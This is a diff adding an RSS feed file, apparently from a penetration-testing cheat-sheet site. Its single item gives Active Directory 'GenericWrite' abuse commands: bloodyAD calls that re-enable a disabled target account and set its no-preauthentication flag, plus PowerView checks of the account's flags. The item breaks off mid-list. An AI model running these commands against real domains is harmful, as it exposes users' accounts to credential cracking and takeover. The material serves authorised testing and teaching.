@@ -1,0 +1,18 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Disabled Account on TLDRBins</title>
+    <link>https://tldrbins.github.io/@disabled-account/</link>
+    <description>Recent content in Disabled Account on TLDRBins</description>
+    <generator>Hugo</generator>
+    <language>en-us</language>
+    <atom:link href="https://tldrbins.github.io/@disabled-account/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>GenericWrite</title>
+      <link>https://tldrbins.github.io/genericwrite/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>https://tldrbins.github.io/genericwrite/</guid>
+      <description>Abuse #1 : Add UF_DONT_REQUIRE_PREAUTH bit to Target User Linux Windows 1. Enable Account [Optional] sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; bloodyAD --host &amp;lt;DC&amp;gt; -d &amp;#34;&amp;lt;DOMAIN&amp;gt;&amp;#34; --dc-ip &amp;lt;DC_IP&amp;gt; -k remove uac &amp;lt;TARGET_USER&amp;gt; -f ACCOUNTDISABLE 2. Add UF_DONT_REQUIRE_PREAUTH bit sudo ntpdate -s &amp;lt;DC_IP&amp;gt; &amp;amp;&amp;amp; bloodyAD --host &amp;lt;DC&amp;gt; -d &amp;#34;&amp;lt;DOMAIN&amp;gt;&amp;#34; --dc-ip &amp;lt;DC_IP&amp;gt; -k add uac &amp;lt;TARGET_USER&amp;gt; -f DONT_REQ_PREAUTH 1. Import PowerView . .\PowerView.ps1 PS C:\programdata&amp;gt; . .\PowerView.ps1 . .\PowerView.ps1 2. Check Target User Get-DomainUser &amp;#39;&amp;lt;TARGET_USER&amp;gt;&amp;#39; | ConvertFrom-UACValue PS C:\programdata&amp;gt; Get-DomainUser &amp;#39;user&amp;#39; | ConvertFrom-UACValue Get-DomainUser &amp;#39;user&amp;#39; | ConvertFrom-UACValue Name Value ---- ----- NORMAL_ACCOUNT 512 3.</description>
+    </item>
+  </channel>
+</rss>
